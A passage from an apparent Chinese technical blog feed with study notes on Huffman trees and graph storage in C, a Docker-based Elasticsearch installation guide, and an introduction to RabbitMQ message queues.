<h3 id="5-5-2-哈夫曼树的构造算法"><a href="#5-5-2-哈夫曼树的构造算法" class="headerlink" title="5.5.2 哈夫曼树的构造算法"></a>5.5.2 哈夫曼树的构造算法</h3><p><strong>1.哈夫曼树的构造过程</strong></p>
<p><strong>2.哈夫曼算法的实现</strong></p>
<p>由于哈夫曼树中没有度为1的结点，则一颗有n个叶子结点的哈夫曼树共有2n-1个结点。</p>
<p>哈夫曼树的存储表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> weight;					<span class="comment">//结点的权值</span></span><br><span class="line">    <span class="keyword">int</span> parent,lchild,rchild;	<span class="comment">//结点的双亲、左孩子、右孩子</span></span><br><span class="line">&#125;*HuffmanTree;					<span class="comment">//动态分配数组存储哈夫曼树</span></span><br></pre></td></tr></table></figure>
<p><font color="ff000">为了实现方便，数组0号单元不使用，从1号单元开始使用，所以数组大小为2n</font>。叶子结点存储在前面部分1~n个位置，后面的n-1个位置存储其余非叶子结点。</p>
<p>构造哈夫曼树算法实现可以分为两部分：</p>
<p>①初始化：首先动态申请2n个单元；然后循环2n-1次，从1号单元开始，依次将1至2n-1所有单元中的双亲、左孩子、右孩子的下标都初始化为0,；最后循环n次，输入前n个单元中叶子结点的权值。</p>
<p>②创建树：循环n-1次，通过n01次的选择、删除与合并来创建哈夫曼树。选择是从当前森林中选择双亲为0且权值最小的两个树根节点s1和s2；删除是指将结点s1和s2的双亲改为非0；合并就是将s1和s2的权值和作为一个新结点的权值依次存入到数组的第n+1之后的单元中，同时记录这个节点做孩子的下标为s1，右孩子的下标为s2。</p>
<h1 id="第六章-图"><a href="#第六章-图" class="headerlink" title="第六章 图"></a>第六章 图</h1><h2 id="6-1-图的定义和基本术语"><a href="#6-1-图的定义和基本术语" class="headerlink" title="6.1 图的定义和基本术语"></a>6.1 图的定义和基本术语</h2><h3 id="6-1-1-图的定义"><a href="#6-1-1-图的定义" class="headerlink" title="6.1.1 图的定义"></a>6.1.1 图的定义</h3><p>　　图由两个集合V和E组成，记为G=(V,E)，其中V是顶点的有穷非空集合，E是V中顶点欧对的有穷集合，这些顶点偶对称为边。V(G)和E(G)通常分别表示图G的顶点集合和边集合。</p>
<p>　　无向图：每条边都没有方向</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618999001-image-20210421175641281.png" alt="image-20210421175641281"></p>
<p>　　有向图：每条边都有方向</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618998974-image-20210421175614149.png" alt="image-20210421175614149"></p>
<p>　　完全图：任意两点都有一条边相连</p>
<center class="half">   <img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618999143-image-20210421175903730.png " width="300"/> <img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618999151-image-20210421175911065.png" width="300"/> </center>

<h3 id="6-1-2-图的基本术语"><a href="#6-1-2-图的基本术语" class="headerlink" title="6.1.2 图的基本术语"></a>6.1.2 图的基本术语</h3><p><strong>顶点的度：</strong>与该顶点相关联的边的数目，记为TD(v)。</p>
<p>　　在有向图中，顶点的度等于该顶点的入度与出度之和。</p>
<p>　　顶点v的<strong>入度是以v为终点</strong>的有向边的条数，记做ID(v)，</p>
<p>　　顶点v的<strong>出度是以v为始点</strong>的有向边的条数，记做OD(v)</p>
<ul>
<li>问：当有向图仅有1个顶点的入度为0，其余顶点的入度均为1，此时是何结构？</li>
<li>答：是一棵树；一颗有向树。</li>
</ul>
<p><strong>路径：</strong>连续的边构成的顶点序列。</p>
<p><strong>路径长度：</strong>路径上边或弧的数目/权值之和。</p>
<p><strong>回路(环)：</strong>第一个顶点和最后一个顶点相同的路径。</p>
<p><strong>简单路径：</strong>路径中各顶点均不相同的路径。</p>
<p><strong>简单回路(简单环)：</strong>除路径起点和终点相同外，其余顶点均不相同的路径。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619599276-image-20210428164116694.png" alt="image-20210428164116694"></p>
<hr>
<p><strong>连通图（强连通图）：</strong>在无（有）向图G=( V, {E} )中，若对任何两个顶点 v、u 都存在从v 到 u 的路径，则称G是连通图（强连通图）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619599384-image-20210428164304480.png" alt="image-20210428164304480"></p>
<p><strong>连通分量：</strong>无向图G 的极大连通子图称为G的连通分量。极大连通子图意思是：该子图是 G 连通子图，将G 的任何不在该子图中的顶点加入，子图不再连通。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619599429-image-20210428164349664.png" alt="image-20210428164349664"></p>
<p><strong>强连通分量：</strong>有向图G 的极大强连通子图称为G的强连通分量。极大强连通子图意思是：该子图是G的强连通子图，将D的任何不在该子图中的顶点加入，子图不再是强连通的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619599481-image-20210428164441752.png" alt="image-20210428164441752"></p>
<p><strong>子图：</strong>设有两个图G=（V，{E}）、G1=（V1，{E1}），若V1  V，E1  E，则称 G1是G的子图。例:(b)、(c) 是 (a) 的子图</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619599589-image-20210428164628941.png" alt="image-20210428164628941"></p>
<p><strong>极小连通子图：</strong>该子图是G 的连通子图，在该子图中删除任何一条边，子图不再连通。（n-1条边）</p>
<p><strong>生成树：</strong>包含无向图G 所有顶点的极小连通子图。</p>
<p><strong>生成森林：</strong>对非连通图，各个连通分量的生成树构成的集合。  </p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619599660-image-20210428164740239.png" alt="image-20210428164740239"></p>
<h2 id="6-2-图的存储结构"><a href="#6-2-图的存储结构" class="headerlink" title="6.2 图的存储结构"></a>6.2 图的存储结构</h2><h3 id="6-2-1-顺序存储结构"><a href="#6-2-1-顺序存储结构" class="headerlink" title="6.2.1 顺序存储结构"></a>6.2.1 顺序存储结构</h3><p><strong>顺序表（邻接矩阵）表示法</strong></p>
<p>①建立一个顶点表（记录各顶点信息）和一个邻接矩阵（表示各顶点之间关系）</p>
<p>②设图A=(V,E)有n个顶点，则图的邻接矩阵是一个二维数组A.Edge[n][n]定义为：</p>
<script type="math/tex; mode=display">
A.Edge[i][j]=\begin{cases}1,　　如果　<i,j>{\in}E　或者　(i,j){\in}E\\
0,　　反之
\end{cases}</script><p><strong>无向图的邻接矩阵表示法</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619600884-image-20210428170804280.png" alt="image-20210428170804280"></p>
<blockquote>
<p>分析1：无向图的邻接矩阵是对称的；<br>分析2：顶点i 的度＝第 i 行 (列) 中1 的个数；<br>分析3：完全图的邻接矩阵中，对角元素为0，其余为1。</p>
</blockquote>
<p><strong>有向图的邻接矩阵表示法</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619601939-image-20210428172539618.png" alt="image-20210428172539618"></p>
<p>注意：在有向图的邻接矩阵中，</p>
<p>　　　第i行含义：以结点$v_i$为尾的弧（即出度边）；</p>
<p>　　　第i列含义：以节点$v_i$为头的弧（即入度边）。</p>
<blockquote>
<p>分析1：有向图的邻接矩阵可能是不对称的。<br>分析2：顶点的出度=第i行元素之和<br>                 顶点的入度=第i列元素之和<br>                 顶点的度=第i行元素之和+第i列元素之和</p>
</blockquote>
<p><strong>网（有权图）的邻接矩阵表示法</strong></p>
<p>定义为：</p>
<script type="math/tex; mode=display">
N.Edge[i][j]=\begin{cases}
W_{ij}　　<v_i,v_j>或(v_i,V_j){\in}V_R\\
\infty　　　无边（弧）
\end{cases}</script><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619655052-image-20210429081052350.png" alt="image-20210429081052350"></p>
<p><strong>邻接矩阵的存储表示</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxInt 3267<span class="comment">//表示极大值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MVNum 100<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> VerTexType;<span class="comment">//假设顶点的数据类型为字符型</span></span><br><span class="line">ttypedef <span class="keyword">int</span> ArcType;<span class="comment">//假设边的权值类型为整型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    VerTexType vexxs[MVNum];<span class="comment">//顶点表</span></span><br><span class="line">    ArcType arcs[MVNum][MVNum];<span class="comment">//邻接矩阵</span></span><br><span class="line">    <span class="keyword">int</span> vexnum,arcnum;<span class="comment">//图的当前点数和边数</span></span><br><span class="line">&#125;AMGraph;</span><br></pre></td></tr></table></figure>
<p><strong>算法：采用来邻接矩阵表示法创建无向网</strong></p>
<blockquote>
<p>算法步骤：</p>
<p>①输入总顶点数和总边数</p>
<p>②依次输入店的信息存入顶点表中</p>
<p>③初始化邻接矩阵，使每个权值初始化为极大值。</p>
<p>④构造邻接矩阵。依次输入每条边依附的顶点和其权值，确定两个顶点在图中的位置之后，使相应边赋予相应的权值，同时使其对称边赋予相同的权值。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Status <span class="title">CreateUDN</span><span class="params">(AMGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="comment">//采用邻接矩阵表示法，创建无向网G</span></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;G.vexnum&gt;&gt;G.arcnum;<span class="comment">//输入总顶点数，总边数</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)<span class="comment">//依次输入点的信息</span></span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;G.vexs[i];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)<span class="comment">//初始化邻接矩阵，边的权值均值为极大值MaxInt</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G&gt;vexnum;j++)</span><br><span class="line">            G.arcs[i][j]=MaxInt;<span class="comment">//构造邻接矩阵</span></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g.arcnum;k++)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;v1&gt;&gt;v2&gt;&gt;w;<span class="comment">//输入一条边依附的顶点及权值</span></span><br><span class="line">        i=LocateVex(G,v1);j=LocateVex(G,v2);<span class="comment">//确定v1和v2在G中的位置，即顶点数组的下标</span></span><br><span class="line">        G.arcs[i][j]=w;<span class="comment">//边&lt;v1,v2&gt;的权值为w</span></span><br><span class="line">        G.arcs[j][i]=G.arcs[i][j];<span class="comment">//置&lt;v1,v2&gt;的对称边&lt;v2,v1&gt;的权值为w</span></span><br><span class="line">    &#125;<span class="comment">//for</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>算法分析</p>
<p>该算法的</p>
</blockquote>
<h3 id="6-2-2-链式存储结构"><a href="#6-2-2-链式存储结构" class="headerlink" title="6.2.2  链式存储结构"></a>6.2.2  链式存储结构</h3><ul>
<li>邻接表</li>
</ul>
<ul>
<li><p>十字链表</p>
</li>
<li><p>邻接多重表</p>
</li>
</ul>
<h2 id="6-3-图的遍历"><a href="#6-3-图的遍历" class="headerlink" title="6.3 图的遍历"></a>6.3 图的遍历</h2><h3 id="6-3-1-深度优先搜索"><a href="#6-3-1-深度优先搜索" class="headerlink" title="6.3.1 深度优先搜索"></a>6.3.1 深度优先搜索</h3><h3 id="6-3-2-广度优先搜索"><a href="#6-3-2-广度优先搜索" class="headerlink" title="6.3.2 广度优先搜索"></a>6.3.2 广度优先搜索</h3><h2 id="6-4-图的应用"><a href="#6-4-图的应用" class="headerlink" title="6.4 图的应用"></a>6.4 图的应用</h2>]]></content>
  </entry>
  <entry>
    <title>ElasticSearch</title>
    <url>/post/d48132d3.html</url>
    <content><![CDATA[<h1 id="1-ElasticSearch简介"><a href="#1-ElasticSearch简介" class="headerlink" title="1 ElasticSearch简介"></a>1 ElasticSearch简介</h1><h2 id="1-1-什么是ElasticSearch"><a href="#1-1-什么是ElasticSearch" class="headerlink" title="1.1 什么是ElasticSearch"></a>1.1 什么是ElasticSearch</h2><p>　　The Elastic Stack, 包括 Elasticsearch、Kibana、Beats 和Logstash（也称为 ELK Stack）。 能够安全可靠地获取任何来源、任何格式的数据，然后实时地对数据进行搜索、分析和可视 化。Elaticsearch，简称为 ES，ES 是一个开源的高扩展的分布式全文搜索引擎，是整个 Elastic Stack 技术栈的核心。它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上 百台服务器，处理PB 级别的数据。<br>　　ElasticSearch是一个基于Lucene的、RESTful风格的搜索和数据分析引擎。是当前流行的企业级搜索引擎。<span id="more"></span></p>
<h2 id="1-2-Elasticsearch特点"><a href="#1-2-Elasticsearch特点" class="headerlink" title="1.2  Elasticsearch特点"></a>1.2  Elasticsearch特点</h2><p>（1）可以作为一个大型分布式集群（数百台服务器）技术，处理PB级数据，服务大公司；也可以运行在单机上</p>
<p>（2）将全文检索、数据分析以及分布式技术，合并在了一起，才形成了独一无二的ES；</p>
<p>（3）开箱即用的，部署简单</p>
<p>（4）全文检索，同义词处理，相关度排名，复杂数据分析，海量数据的近实时处理</p>
<h2 id="1-3-Elasticsearch应用案例"><a href="#1-3-Elasticsearch应用案例" class="headerlink" title="1.3 Elasticsearch应用案例"></a>1.3 Elasticsearch应用案例</h2><ul>
<li>GitHub：2013年初，GitHub将solr缓存改为es，以便用户搜索20TB的数据</li>
<li>维基百科：启动以es为基础的核心搜索架构SoundCloud</li>
<li>百度：以es作为数据分析引擎，20多个业务线采集服务器上的各类数据以及用户自定义数据，通过对各种数据进行多维分析，辅助定位异常。其单集群最大100台机器，200个es节点，每天导入超过30TB的数据</li>
<li>新浪、阿里、携程、苏宁等各大公司的站内搜索、数据分析中使用</li>
</ul>
<h2 id="1-4-Elasticsearch体系结构"><a href="#1-4-Elasticsearch体系结构" class="headerlink" title="1.4 Elasticsearch体系结构"></a>1.4 Elasticsearch体系结构</h2><p>　　Elasticsearch 是面向文档型数据库，一条数据在这里就是一个文档。 我们将 Elasticsearch 里存储文档数据和关系型数据库MySQL 存储数据的概念进行一个类比</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1620734297-image-20210511195817096.png" alt="image-20210511195817096"></p>
<h1 id="2-安装Elasticsearch"><a href="#2-安装Elasticsearch" class="headerlink" title="2 安装Elasticsearch"></a>2 安装Elasticsearch</h1><h2 id="2-1-Windows下安装"><a href="#2-1-Windows下安装" class="headerlink" title="2.1 Windows下安装"></a>2.1 Windows下安装</h2><p>　　参考</p>
<h2 id="2-2-Docker环境下安装ElasticSearch"><a href="#2-2-Docker环境下安装ElasticSearch" class="headerlink" title="2.2 Docker环境下安装ElasticSearch"></a>2.2 Docker环境下安装ElasticSearch</h2><h3 id="2-2-1-容器创建"><a href="#2-2-1-容器创建" class="headerlink" title="2.2.1 容器创建"></a>2.2.1 容器创建</h3><p><strong>1、下载镜像</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull elasticsearch:<span class="number">5</span>.<span class="number">6</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p><strong>2、创建容器</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> run ‐di ‐‐name=myes ‐p <span class="number">9200</span>:<span class="number">9200</span> ‐p <span class="number">9300</span>:<span class="number">9300</span></span><br><span class="line"><span class="attribute">elasticsearch</span>:<span class="number">5</span>.<span class="number">6</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p><strong>3、浏览器输入地址：</strong></p>
<p>192.168.200.133:9200，即可看到以下信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Q6z1-G-&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cluster_name&quot;</span>: <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cluster_uuid&quot;</span>: <span class="string">&quot;kSGG2E7QQCm3SXyHLpQy1g&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;number&quot;</span>: <span class="string">&quot;5.6.12&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_hash&quot;</span>: <span class="string">&quot;cfe3d9f&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_date&quot;</span>: <span class="string">&quot;2018-09-10T20:12:43.732Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_snapshot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;lucene_version&quot;</span>: <span class="string">&quot;6.6.1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;tagline&quot;</span>: <span class="string">&quot;You Know, for Search&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>4、我们修改demo的application.yml</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">   <span class="attr">elasticsearch:</span></span><br><span class="line">      <span class="string">cluster‐nodes:</span> <span class="number">192.168</span><span class="number">.200</span><span class="number">.133</span><span class="string">:9300</span></span><br></pre></td></tr></table></figure>
<p><strong>5、运行测试程序，发现会如下报错：</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">NoNodeAvailableException[None of the configured nodes are available:</span><br><span class="line">[&#123;#transport#‐<span class="number">1</span>&#125;&#123;exvgJLR‐RlCNMJy‐hzKtnA&#125;&#123;<span class="number">192.168</span>.<span class="number">184.135</span>&#125;</span><br><span class="line">&#123;<span class="number">192.168</span>.<span class="number">184.135</span>:<span class="number">9300</span>&#125;]</span><br><span class="line">]</span><br><span class="line">at</span><br><span class="line">org<span class="selector-class">.elasticsearch</span><span class="selector-class">.client</span><span class="selector-class">.transport</span><span class="selector-class">.TransportClientNodesService</span>.ensureNodes</span><br><span class="line"><span class="function"><span class="title">AreAvailable</span><span class="params">(TransportClientNodesService.java:<span class="number">347</span>)</span></span></span><br><span class="line">at</span><br><span class="line">org<span class="selector-class">.elasticsearch</span><span class="selector-class">.client</span><span class="selector-class">.transport</span><span class="selector-class">.TransportClientNodesService</span>.execute(Tra</span><br><span class="line">nsportClientNodesService<span class="selector-class">.java</span>:<span class="number">245</span>)</span><br><span class="line">at</span><br><span class="line">org<span class="selector-class">.elasticsearch</span><span class="selector-class">.client</span><span class="selector-class">.transport</span><span class="selector-class">.TransportProxyClient</span>.execute(TransportP</span><br><span class="line">roxyClient<span class="selector-class">.java</span>:<span class="number">59</span>)</span><br></pre></td></tr></table></figure>
<p>这是因为es从5版本之后默认不开启远程连接，需要修改配置文件</p>
<p><strong>6、我们进入容器</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker exec -it myes <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>
<p>此时，我们看到elasticsearch所在的目录为/usr/share/elasticsearch，进入config看到了配置文件</p>
<p>elasticsearch.yml</p>
<p>我们通过vi命令编辑此文件，尴尬的是容器没有vi命令，怎么办？我们需要以文件挂载的方式创建容器才行，这样我们就可以通过修改宿主机中的某个文件来实现对容器内配置文件的修改</p>
<p><strong>7、拷贝配置文件到宿主机</strong></p>
<p>首先退出容器，然后执行命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker cp</span><br><span class="line">myes:<span class="regexp">/usr/</span>share<span class="regexp">/elasticsearch/</span>config<span class="regexp">/elasticsearch.yml /u</span>sr<span class="regexp">/share/</span>elasticsearch.yml</span><br></pre></td></tr></table></figure>
<p><strong>8、停止和删除原来创建的容器</strong></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">docker</span> <span class="string">stop myes</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">rm myes</span></span><br></pre></td></tr></table></figure>
<p><strong>9、重新执行创建容器命令</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -di --name=myes -p <span class="number">9200</span>:<span class="number">9200</span> -p <span class="number">9300</span>:<span class="number">9300</span> -v <span class="regexp">/usr/</span>share<span class="regexp">/elasticsearch.yml:/u</span>sr<span class="regexp">/share/</span>elasticsearch<span class="regexp">/config/</span>elasticsearch</span><br><span class="line">.yml elasticsearch:<span class="number">5.6</span>.<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p><strong>10、修改</strong>/usr/share/elasticsearch.yml将<code>transport.host:0.0.0.0</code>前的#去掉后保存退出。其作用是允许任何IP地址访问elasticsearch。开发测试阶段可以这么做，生产环境下指定具体的IP。</p>
<p>11、重新启动</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker restart myes</span></span><br></pre></td></tr></table></figure>
<p>　　重启之后发现重启失败？这与我们刚才修改的配置有关，因为elasticsearch在启动的时候会进行一些检查，比如最多打开的文件的个数以及虚拟内存区域数量等，如果放开了此配置，以为这需要打开更多的文件以及虚拟内存，所以我们需要调优。</p>
<p><strong>12、系统调优</strong></p>
<p>我们一共需要修改两处</p>
<p>修改/etc/security/limits.conf，追加内容</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">* soft nofile <span class="number">65536</span></span><br><span class="line">* hard nofile <span class="number">65536</span></span><br></pre></td></tr></table></figure>
<p>nofile是单个进程允许打开的最大文件个数</p>
<p>soft nofile是软限制，hard nofile是硬限制</p>
<p>修改/etc/sysctl.conf，追加内容</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">vm.max_map_count</span>=<span class="number">655360</span></span><br></pre></td></tr></table></figure>
<p>限制一个进程可以拥有的VMA（虚拟内存区域）的数量</p>
<p>执行下面命令，修改内核参数马上生效：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sysctl -p</span></span><br></pre></td></tr></table></figure>
<p>之后重启虚拟机和容器</p>
<h3 id="2-2-2-IK分词器安装"><a href="#2-2-2-IK分词器安装" class="headerlink" title="2.2.2 IK分词器安装"></a>2.2.2 IK分词器安装</h3><p><strong>1、首先确定ES版本，</strong>然后到github上下载对应版本的IK分词器，<a href="https://github.com/medcl/elasticsearch-analysis-ik">https://github.com/medcl/elasticsearch-analysis-ik</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1620632235-image-20210510153715459.png" alt="image-20210510153715459"></p>
<p><strong>2、通过docker命令将zip包复制到ES容器指定位置</strong></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">docker cp /tmp/elasticsearch-analysis-ik<span class="number">-7.8</span>.0.zip &#123;容器名&#125;<span class="symbol">:/usr/share/elasticsearch/plugins</span></span><br></pre></td></tr></table></figure>
<p><strong>3、进入docker容器对其进行解压操作，<font color="ff000">注意解压完将zip包删除，ik文件夹下没有子目录</font></strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line"><span class="attribute">docker</span> exec -it myes /bin/bash</span><br><span class="line"><span class="comment"># 将文件压缩包移动到plugins中</span></span><br><span class="line"><span class="attribute">mv</span> elasticsearch-analysis-ik-<span class="number">7</span>.<span class="number">8</span>.<span class="number">0</span>.zip /usr/share/elasticsearch/plugins</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line"><span class="attribute">unzip</span> elasticsearch-analysis-ik-<span class="number">7</span>.<span class="number">8</span>.<span class="number">0</span>.zip</span><br><span class="line"><span class="comment"># 删除压缩包</span></span><br><span class="line"><span class="attribute">rm</span> -rf elasticsearch-analysis-ik-<span class="number">7</span>.<span class="number">8</span>.<span class="number">0</span>.zip</span><br></pre></td></tr></table></figure>
<p><strong>4、重启docker容器</strong></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker restart myes</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-3-HEAD插件"><a href="#2-2-3-HEAD插件" class="headerlink" title="2.2.3 HEAD插件"></a>2.2.3 HEAD插件</h3><p><strong>1、跨域配置</strong></p>
<p>修改/usr/share/elasticsearch.yml，增加以下三条命令：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">http<span class="selector-class">.cors</span><span class="selector-class">.enabled</span>: true</span><br><span class="line">http<span class="selector-class">.cors</span><span class="selector-class">.allow-origin</span>: <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>
<p>其中：<br><strong>http.cors.enabled: true：</strong>此步为允许elasticsearch跨域访问，默认是false。<br><strong>http.cors.allow-origin: “*”：</strong>表示跨域访问允许的域名地址（*表示任意）。</p>
<p><strong>2、重新启动elasticseach容器</strong></p>
<p><strong>3、下载head镜像（此步省略）</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker pull mobz/elasticsearch‐head:<span class="number">5</span></span><br></pre></td></tr></table></figure>
<p><strong>4、创建head容器</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> ‐di ‐‐<span class="attribute">name</span>=myhead ‐p 9100:9100 容器ID</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>RabbitMQ消息中间件</title>
    <url>/post/b05f3d3d.html</url>
    <content><![CDATA[<h1 id="1-RabbitMQ介绍"><a href="#1-RabbitMQ介绍" class="headerlink" title="1 RabbitMQ介绍"></a>1 RabbitMQ介绍</h1><h2 id="1-1-RabbitMQ"><a href="#1-1-RabbitMQ" class="headerlink" title="1.1 RabbitMQ"></a>1.1 RabbitMQ</h2><p>　　MQ全称为Message Queue，即消息队列，RabbitMQ是由erlang语言开发，基于AMQP（Advanced Message Queue高级消息队列协议）协议实现的消息队列，它是一种应用程序之间的通信方法，消息队列在分布式系统开发中应用非常广泛。RabbitMQ官方地址：<a href="http://www.rabbitmq.com">http://www.rabbitmq.com</a><span id="more"></span></p>
<p>开发中消息队列通常有如下应用场景：</p>
<p>1、任务异步处理。</p>
<p>将不需要同步处理的并且耗时长的操作由消息队列通知消息接收方进行异步处理。提高了应用程序的响应时间。</p>
<p>2、应用程序解耦合</p>
<p>MQ相当于一个中介，生产方通过MQ与消费方交互，它将应用程序进行解耦合。</p>
<p>市场上还有哪些消息队列？</p>
<p>ActiveMQ、RabbitMQ、ZeroMQ、Kafka、MetaMQ、RocketMQ、Redis</p>
<p>为什么使用RabbitMQ呢？</p>
<p>1.使用简单，功能强大</p>
<p>2.基于AMQP协议</p>
<p>3.社区活跃，文档完善</p>
<p>4.高并发性能好，这主要得益于erlang语言</p>
<p>5.Springboot默认集成RabbitMQ</p>
<h2 id="1-2-其他相关知识"><a href="#1-2-其他相关知识" class="headerlink" title="1.2 其他相关知识"></a>1.2 其他相关知识</h2><h3 id="AMQP"><a href="#AMQP" class="headerlink" title="AMQP"></a>AMQP</h3><p>　　AMQP，即Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。Erlang中的实现有RabbitMQ等。</p>
<p>官方网站：<a href="http://www.amqp.org">http://www.amqp.org</a></p>
<h3 id="JMS"><a href="#JMS" class="headerlink" title="JMS"></a>JMS</h3><p>　　Java 消息服务（Java Message Service，JMS）应用程序接口应用程序接口是一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间，或分布式系统分布式系统中发送消息，进行异步通信异步通信。Java 消息服务是一个与具体平台无关的 API，绝大多数 MOM 提供商都对 JMS 提供支持。</p>
<p><strong>总结</strong></p>
<p>　　JMS是java提供的一套消息服务API标准，其目的是为所有的java应用程序提供统一的消息通信的标准，类似java的jdbc，只要遵循jms标准的应用程序之间都可以进行消息通信。它和AMQP有什么不同？jms是java语言专属的消息服务标准，它是在api层定义标准，并且只能用于java应用；而AMQP是在协议层定义的标准，是跨语言的。</p>
<h1 id="2-快速入门"><a href="#2-快速入门" class="headerlink" title="2 快速入门"></a>2 快速入门</h1><h2 id="2-1-RabbitMQ工作原理"><a href="#2-1-RabbitMQ工作原理" class="headerlink" title="2.1 RabbitMQ工作原理"></a>2.1 RabbitMQ工作原理</h2><p>RabbitMQ的基本结构</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1620392042-image-20210507205402014.png" alt="image-20210507205402014"></p>
<p>组成部分说明：</p>
<ul>
<li><p>Broker：消息队列服务进程，此进程包括两个部分：Exchange和Queue。</p>
<ul>
<li><p>Exchange：消息队列交换机，按一定的规则将消息路由转发到某个队列，对消息进行过滤。</p>
</li>
<li><p>Queue：消息队列，存储消息的队列，消息到达队列并转发给指定的消费方。</p>
</li>
</ul>
</li>
<li><p>Producer：消息生产者，即生产方客户端，生产方客户端将消费发送到MQ。</p>
</li>
<li><p>Consumer：消息消费者，即消费方客户端，接受MQ转发的消息。</p>
</li>
</ul>
<p>消息发布接收流程：</p>
<p>———-发送消息————</p>
<p>1、生产者和Broker建立TCP连接。</p>
<p>2、生产者和Broker建立通道。</p>
<p>3、生产者通过通道消息发送Broker，由Exchange将消息进行转发。</p>
<p>———-接收消息————</p>
<p>1、消费者和Broker建立TCP连接</p>
<p>2、消费者和Broker建立通道</p>
